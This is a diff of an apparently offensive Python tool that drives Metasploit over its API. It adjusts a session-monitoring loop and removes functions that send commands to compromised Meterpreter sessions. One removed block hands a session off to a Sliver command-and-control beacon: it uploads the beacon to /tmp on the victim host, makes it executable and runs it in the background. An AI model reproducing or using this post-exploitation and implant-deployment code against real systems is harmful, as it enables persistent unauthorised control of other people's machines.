@@ -48,7 +48,7 @@ def monitor_meterpreter_sessions():
                       f"({sess['type']}){RESET}")
         except Exception:
             pass
-        time.sleep(5)          # keep CPU happy
+        time.sleep(10)          # keep CPU happy
         
 def run_meterpreter_exploit(target_ip):
     """Execute a Meterpreter payload against the target."""
@@ -81,44 +81,6 @@ def generate_meterpreter_payload():
         print(f"{RED}[!] Failed to generate Meterpreter payload: {e}{RESET}")
         return None
 # Alex End
-
-def monitor_meterpreter_sessions():
-    """Monitor for new Meterpreter sessions."""
-    if msfInstance is None:
-        return f"{RED}[-] Not connected to Metasploit.{RESET}"
-
-    while True:
-        sessions = msfInstance.sessions.list
-        if sessions:
-            for sid, session in sessions.items():
-                print(f"{GREEN}[+] Meterpreter session {sid} detected ({session['type']}){RESET}")
-        time.sleep(5)  # Check every 5 seconds
-
-def interact_meterpreter(session_id, command):
-    """Send commands to an active Meterpreter session."""
-    if msfInstance is None:
-        return f"{RED}[-] Not connected to Metasploit.{RESET}"
-
-    session = msfInstance.sessions.session(session_id)
-    if not session:
-        return f"{RED}[!] Invalid session ID: {session_id}{RESET}"
-
-    # Session passing (msf > sliver)
-    # Alex New
-    if command == "transfer-sliver":
-        beacon_path = generate_beacon("5", "10", SLIVER_HOST, "linux", "amd64", "sliver_beacon", format="bin")
-        if not beacon_path:
-            return f"{RED}[-] Failed to generate Sliver beacon for handoff.{RESET}"
-        session.write(f"upload {beacon_path} /tmp/sliver_beacon")
-        session.run_with_output("shell chmod +x /tmp/sliver_beacon && /tmp/sliver_beacon &")
-        return f"{GREEN}[+] Handed off session {session_id} to Sliver{RESET}"
-    #else:
-    #    response = session.run_with_output(command)
-    #    return f"{GREEN}[+] Meterpreter Response:\n{response}{RESET}"
-    # Alex End
-
-    response = session.run_with_output(command)
-    return f"{GREEN}[+] Meterpreter Response:\n{response}{RESET}"
 
 def connect_to_msfserver(password, server, port, max_retries=10, retry_delay=2):
     print(f"{GREEN}=============== Starting Metasploit API ==============={RESET}")
